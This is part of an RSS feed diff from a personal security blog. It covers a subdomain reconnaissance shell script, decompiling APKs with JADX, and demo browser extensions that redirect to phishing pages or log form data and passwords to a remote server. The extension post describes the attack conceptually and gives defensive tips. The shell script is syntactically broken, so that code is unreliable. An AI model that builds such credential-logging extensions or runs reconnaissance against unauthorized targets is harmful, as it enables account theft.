+That is easy too. In the shell, if you pass an argument to a script i.e, like in the above scenario then target.com will occupy the first position of passed arguments. Which you can access simply via calling $1. If you have multiple values as arguments then each will occupy consecutive locations i.e, if the command looked like the following,
+<em>subscan.sh target1.com target2.com</em>
+Then $1 = target1.com and $2=target2.com and so on. Simple right?</p>
+</blockquote>
+<p>This tool will be taking a single argument as input so the first thing we will have to ensure is that the user has provided at least a single argument. This can be achieved by incorporating the following code.</p>
+<pre><code>    if [ “$#” -eq 0];then
+
+    echo “Missing argument”
+
+    exit 1
+</code></pre><p>Here we’re checking whether any argument is being passed or not. If you haven’t passed any argument then it will print Missing argument. The next step is to define the <em>else</em> statement but before adding the code we displayed in Step#1 you should consider creating directories to save the output to. Because if you’re planning to use this tool in the long run and you’re saving all the output to a single directory then it will become messy and not convenient after a while. To save files to a convenient directory, we will output the files into <strong>$HOME/subscanner/$1</strong>.</p>
+<p>Doesn’t make sense? Let’s understand what this directory structure is</p>
+<p>$HOME is the home directory of the current user. subscanner is the new directory we are creating and $1 as you know will be the argument value that is being passed(target.com). So in effect if you run the command</p>
+<blockquote>
+<p><em>subscan.sh target.com</em>
+Then the output will be saved under <em>/home/user/subscanner/target.com/output.txt</em>. So far so good let’s incorporate this logic into our code.</p>
+</blockquote>
+<p><strong>Step#3</strong>:: The tool</p>
+<pre><code>    #!/bin/sh
+
+    if [ “$#” -eq 0];then
+
+    echo “Missing argument”;
+
+    exit 1
+
+    dir=$1
+
+    mkdir -p $HOME/subscanner/$dir;
+
+    mkdir -p $HOME/subscanner/$dir/screenshot;
+
+    sublister -d $1 -t 50 -o $HOME/subscanner/$dir/output.txt &amp; subfinder -d $1 &gt;&gt; $HOME/subscanner/$dir/output.txt;
+
+    sort -u -o $HOME/subscanner/$dir/output.txt $HOME/subscanner/$dir/output.txt
+
+    cat $HOME/subscanner/$dir/output.txt | httpx -o $HOME/subscanner/$dir/output.txt
+
+    gowitness -T 5 file -s output.txt -d $HOME/subscanner/$dir/screenshot
+</code></pre><p>Once run, this tool will scan a single target at a time and will save the list of unique subdomains under <em>/home/user/subscanner/target.com</em> and the respective screenshots under <em>/home/user/subscanner/target.com/screenshot</em>. Like this, you could automate every tool in your system you could even run these in cronjobs to schedule to repeat in certain intervals.</p>
+<blockquote>
+<pre><code>Note: All the mentioned tools(sublister,httpx,…)should be globally accessible in order for the new tool to work. If not try adding it to .bashrc
+</code></pre>
+</blockquote>
+<p>I would be happier if you could create a tool of your own after reading this.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The Hidden Treassure</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2021/02/the-hidden-treassure/</link>
+            <pubDate>Wed, 17 Feb 2021 10:14:09 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2021/02/the-hidden-treassure/</guid>
+            <description>JK Gyllenhaal’s Source Code is one of my favorite movies, but we’re not going to talk about it here. This is not a movie review, but let’s see how to extract source code from compiled Android apps. Let’s first understand what APK is.
+ An Android Package Kit (APK for short) is an archive type package file format used by the Android operating system for distribution and installation of mobile apps.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post2.jpeg" alt="image"></p>
+<p>JK Gyllenhaal’s Source Code is one of my favorite movies, but we’re not going to talk about it here. This is not a movie review, but let’s see how to extract source code from compiled Android apps. Let’s first understand what APK is.</p>
+<blockquote>
+<p>An Android Package Kit (APK for short) is an archive type package file format used by the Android operating system for distribution and installation of mobile apps.</p>
+</blockquote>
+<p>We see Apk as an application rather than a package. Many of us don’t know if we can see the source code or understand the application logic. Most Android users also use the Play Store to install apps, making it difficult to find the file in the file manager. The method of retrieving the source code from the compiled application is called reverse engineering or decompilation. If you are interested in SAST you should be aware of one of these decompilation tools, as you will start the process from the source code itself. In this blog, we will learn how to retrieve the necessary files from an application package.</p>
+<p>We will be using JADX for this purpose. JADX is a java decompiler that comes with both CLI/GUI interfaces making our activity easier. Without further ado let’s get started 😉</p>
+<h2 id="installation-and-configuration">Installation and configuration</h2>
+<ol>
+<li>
+<p>Head over to the <a href="https://github.com/skylot/jadx/">JADX GitHub repo</a>.
+<img src="https://miro.medium.com/max/700/1*2bj85IWksf-es_50N7c7ng.png" alt="image"></p>
+</li>
+<li>
+<p>Click on <a href="https://github.com/skylot/jadx/releases">releases</a> and download the latest version of the JADX zip file.
+<img src="https://miro.medium.com/max/700/1*D0zzqI0GJuSqSu-4bxt6NQ.png" alt="image"></p>
+</li>
+<li>
+<p>Once downloaded extract the contents of the zip file in a folder of your preference.
+<img src="https://miro.medium.com/max/700/1*eNR8QSUYoaGC68sATMh7TQ.png" alt="image"></p>
+</li>
+<li>
+<p>Now open the bin directory and right-click on the jadx-gui file. Select run as administrator.
+<img src="https://miro.medium.com/max/700/1*mYOFhLTX6AW4eaq-Zi-C2g.png" alt="image"></p>
+</li>
+<li>
+<p>It will start the application and upon loading the GUI it will prompt you to choose the APK. Select the appropriate Apk and you are good to go.
+<img src="https://miro.medium.com/max/700/1*gNpj72gnZ1TTFJ9l42uRAg.png" alt="image"></p>
+</li>
+<li>
+<p>The retrieved information can be found in different directories For example, the Source code directory contains the source code information, Resources contains various resources including XML file and so on.
+<img src="https://miro.medium.com/max/700/1*K9UkoQEXZgLMudlLvOsGEQ.png" alt="image"></p>
+</li>
+</ol>
+<p>If you’re having trouble with the latest versions of JADX feel free to install downgraded versions also, choose the one which works fine for you. I chose JADX because it is super beginner-friendly and easy to setup. Also, JADX is not the only tool capable of doing this you could use Apktool which comes pre-installed in most kali distributions or use any alternatives that suit you best.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>The Unknown Browser Extension</title>
+            <link>https://scr1p7k1dd13.github.io/posts/2020/12/the-unknown-browser-extension/</link>
+            <pubDate>Wed, 02 Dec 2020 22:47:28 +0530</pubDate>
+            
+            <guid>https://scr1p7k1dd13.github.io/posts/2020/12/the-unknown-browser-extension/</guid>
+            <description>We make use of browser extensions almost every day. It helps us in a variety of ways. Improving productivity, user experience, and the list goes on. It is more than a simple Icon sitting on the top right corner of the browser bar. If you don’t know what a browser extension is, read the description below.
+ A browser extension is a small software application that adds a capacity or functionality to a web browser.</description>
+            <content type="html"><![CDATA[<p><img src="/images/post1.jpeg" alt="image"></p>
+<p>We make use of browser extensions almost every day. It helps us in a variety of ways. Improving productivity, user experience, and the list goes on. It is more than a simple Icon sitting on the top right corner of the browser bar. If you don’t know what a browser extension is, read the description below.</p>
+<blockquote>
+<p>A browser extension is a small software application that adds a capacity or functionality to a web browser. A browser extension, also called a plug-in, can take advantage of the same application program interfaces (APIs) that JavaScript can on a web page, but the extension can do more because it also has access to its own set of APIs.</p>
+</blockquote>
+<p>Now I hope you have an idea of ​​what a browser extension is. Being a security enthusiast myself I always wondered what could have gone wrong using these extensions. I have more than five extensions installed on my web browser. These extensions include cookie editors, web application technology identifier, grammar checker,…etc.</p>
+<p>These extensions are very helpful and a time saver. Imagine you are a content writer, having a grammar checker on your browser will be super helpful when you want the sentences to look good. I have this browser extension which always helps me in writing good reports and emails. Let’s call the extension the “good ext”.</p>
+<p>So what the good ext does is that as I write it will give suggestions and highlight which portions need changes. Cool right? but wait</p>
+
+    <img src="https://media.giphy.com/media/xT9KVmZwJl7fnigeAg/giphy.gif"  alt="Hello Friend"  class="center"  style="width:500px;height:300px;"  />
+
+
+<p>Let us first understand what is happening here. To highlight those fields or to make those changes, the extension should interact with the DOM or simply it is interacting with the webpage that is loaded in the browser. It is injecting or adding elements to the webpage to make those changes.</p>
+<p>You might be wondering what is wrong with this behavior. There is nothing wrong with this behavior until the good ext becomes the bad ext. There is no guarantee that an extension will only perform those actions which are put in its description. Imagine my cookie editor sending the web site cookies to a malicious server in the background. If so it could lead to the compromise of my online accounts, sensitive information, and other data. Nowadays we could add custom made extensions also.</p>
+<blockquote>
+<p>In chrome, you could enable developer mode to load custom made extensions to your browser.</p>
+</blockquote>
+<p>There are so many extensions available in Github itself. Which are useful for many purposes. After having all this information and doubts I did a small research on the same. Just to see what could have gone wrong if I install malicious extensions on my browser. I saw so many articles, various extensions in Github, videos, and also <a href="https://threatpost.com/500-malicious-chrome-extensions-millions/152918/">threatpost</a> news. Researchers were warning users about malicious extensions for a very long time but the sad truth is nobody really cares about it. As long as it serves a purpose people are blindly installing these.</p>
+
+    <img src="https://media.giphy.com/media/NQhAjOY4uydr0nAqVM/giphy.gif"  alt="Hello Friend"  class="center"  />
+
+
+<p>We have a lot of people around us who don’t know much about the extensions but use the extensions for daily needs. If something malicious can be done then it should be demoed also. For that, I made three custom chrome extensions. Namely,</p>
+<ol>
+<li><em>Krypton</em></li>
+<li><em>Carbon</em></li>
+<li><em>Log My Data</em></li>
+</ol>
+<p><strong>Krypton</strong>:- Simple web redirector. If you visit website A and you have krypton installed then you will automatically get redirected to website B.</p>
+<p><strong>Carbon</strong>:- For enabling Dark theme on your browser.</p>
+<p><strong>Log My Data</strong>:- For logging and analyzing data you have entered online.</p>
+<p>Now that we have the extensions let&rsquo;s see what could have gone wrong if the above three were malicious extensions.</p>
+
+    <img src="https://media.giphy.com/media/2zelCiUo5KJyN8MgMr/giphy.gif"  alt="Hello Friend"  class="center"  />
+
+
+<p>Let&rsquo;s start with Krypton. Imagine that someone or myself installed this extension on my browser. I won’t notice any quick changes in the look or feel of the browser. But the extension is actively listening for some event or the user to visit a particular URL. In this case, I set it to facebook.com. So when I visit facebook.com from my browser I will automatically get redirected to some other page. Now you might be getting some idea about what could go wrong here. Yes, it is similar to a phishing attack where the user is tricked to visit a page or do some action but in this case, you don’t have to worry about delivering any emails. It is more effective than a normal phishing attack where the user might become suspicious upon seeing the URL. In this case, the user enters a valid URL or domain name which in this case is facebook.com, and only upon loading the legitimate site it is getting redirected. If I have a clone of Facebook where I record every input field values I could have redirected the user to my site and steal their data. The user won’t notice these changes because initially he entered a valid URL and he will expect the rest of the pages from Facebook itself.</p>
+<p><img src="https://miro.medium.com/max/1000/1*lm2ErU4Gul7GadDnnCDIyg.gif" alt="gif"></p>
+<blockquote>
+<p>You might be on the attackers page even if the URL seems to be legitimate. Because what you see is limited to the browser you use. If the browser is vulnerable to address bar spoofing even an expert will be exposed to phishing attacks.</p>
+</blockquote>
+<p>Let&rsquo;s skip carbon because it is for integration purposes. Nobody will install a redirector extension because it is useless and annoying at the same time(Can only be used to prank). We could combine both Krypton and carbon to a single extension so that for the end-user it will be a dark mode enabler but in the background, it will do the actions as done by krypton.</p>
+<p>Now let us talk about Log my data(LMD). Of the three, the most interesting is LMD. This will help you monitor the data you have entered online and to store things that you may have forgotten. It stores information on the browser&rsquo;s local storage. Local storage is a type of web storage that allows JavaScript sites and apps to store and access data right in the browser with no expiration date. This means the data stored in the browser will persist even after the browser window has been closed. It’s not a problem if the data is stored locally but it’s a problem if the data is sent to a server controlled by someone else. What if the extension stores the data locally and sent to a server at the same time. This is exactly what LMD does. It stores data in the browser and sends data to a server I control. LMD is capable of recording passwords, contact field information, mail id’s, form inputs,….etc. If someone installs LMD on their browser then every time they submit a form or log in to a site I will get a hit on my server with the data they’ve entered. I can also track which site the user is currently on.</p>
+<p><img src="https://miro.medium.com/max/1000/1*KuPiHTiLQD8gTMN1AJ4qSA.gif" alt="gif"></p>
+<h2 id="-how-to-protect-yourself-from-such-extensions">💡 How to protect yourself from such extensions</h2>
+<ol>
+<li>Install extensions from verified sources.</li>
+<li>If possible always use incognito mode for browsing. Extensions won’t work in this mode.</li>
+<li>Keep an eye on the permissions they have. In chrome click on the extension icon and go through the extension list. Analyze the permissions.</li>
+<li>Never use extensions from unknown sources or suggested by someone else.</li>
+<li>If you are installing an open-source browser extension, it is best to read the source code and understand the logic.</li>
+</ol>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
